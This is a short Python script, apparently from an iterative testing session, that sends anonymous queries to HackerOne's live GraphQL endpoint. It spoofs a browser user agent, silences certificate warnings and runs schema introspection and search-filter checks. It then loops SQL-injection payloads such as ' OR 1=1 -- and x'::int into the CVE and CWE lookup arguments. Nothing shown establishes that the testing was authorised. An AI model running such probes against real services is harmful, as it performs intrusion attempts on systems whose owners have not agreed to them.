# -*- coding: utf-8 -*-
"""h1x49k2b: 修正轮——枚举内省 + nodes 级 search 过滤验证(匿名)"""
import sys, io, json, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def probe(name, qstr, timeout=18):
    t0 = time.time()
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        dt = round(time.time() - t0, 1)
        print(f'--- {name} [{r.status_code} {dt}s] {r.text.replace(chr(10), " ")[:350]}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e}')
    time.sleep(0.8)

# 1. LeaderboardKeyEnum 枚举值
probe('LB_enum', '{ __type(name: "LeaderboardKeyEnum") { enumValues { name } } }')
# 2. CWE search 死参数对照
probe('CWE_zzz', '{ cwe_entries(search: "zzz_nonexistent_9f3k", first: 1) { total_count nodes { id } } }')
# 3. RCE nodes 级验证 search 是否生效
probe('RCE_nodes_ok', '{ ranked_cve_entries(search: "heartbleed", first: 1) { total_count nodes { __typename } } }')
# 4. RCE 无 search nodes 对照
probe('RCE_nodes_plain', '{ ranked_cve_entries(first: 1) { total_count nodes { __typename } } }')
# 5. CVE 单数带注入(补 x49k 未覆盖载荷)
Q = chr(39)
for v in ['CVE-2014-0160', Q, 'x' + Q, Q + ' OR 1=1 --', "x'::int", 'x--', '%', '*']:
    probe('CVE1 ' + repr(v)[:16], '{ cve_entry(cve_id: %s) { id } }' % json.dumps(v))
# 6. CWE 单数带注入(补载荷)
for v in ['CWE-89', Q, Q + ' OR 1=1 --', "x'::int", 'x--', '%']:
    probe('CWE1 ' + repr(v)[:16], '{ cwe_entry(cwe_id: %s) { id } }' % json.dumps(v))
